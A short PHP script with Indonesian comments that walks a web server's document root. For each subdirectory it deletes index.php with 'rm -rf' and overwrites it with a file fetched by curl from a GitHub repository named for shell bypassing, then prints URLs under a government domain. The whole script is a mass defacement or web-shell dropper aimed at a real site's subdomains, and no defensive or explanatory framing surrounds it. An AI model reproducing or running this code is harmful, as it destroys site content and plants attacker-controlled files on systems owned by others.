<?php

    $dir_path = $_SERVER['DOCUMENT_ROOT'];

    $dirscan = array_diff(scandir($dir_path), array(".", ".."));;

    $dir_list = array();

    foreach ($dirscan as $dir) {
        if (is_dir($dir_path . "/" . $dir)) { // memeriksa apakah file tersebut direktori
            // $dir_list[] = $dir; // jika iya, tambahkan ke daftar direktori

            $directory = $dir_path . '/' . $dir;

            $listing_dir = $directory . '/' . 'index.php';

            shell_exec('rm -rf ' . $listing_dir);

            shell_exec('curl https://raw.githubusercontent.com/ghost-exploiter/shell-bypass403/master/tes.html >> ' . $listing_dir);
            
            echo "https://" . $dir . "pulaumorotaikab.go.id/";
        }
    }
    echo "success"

?>
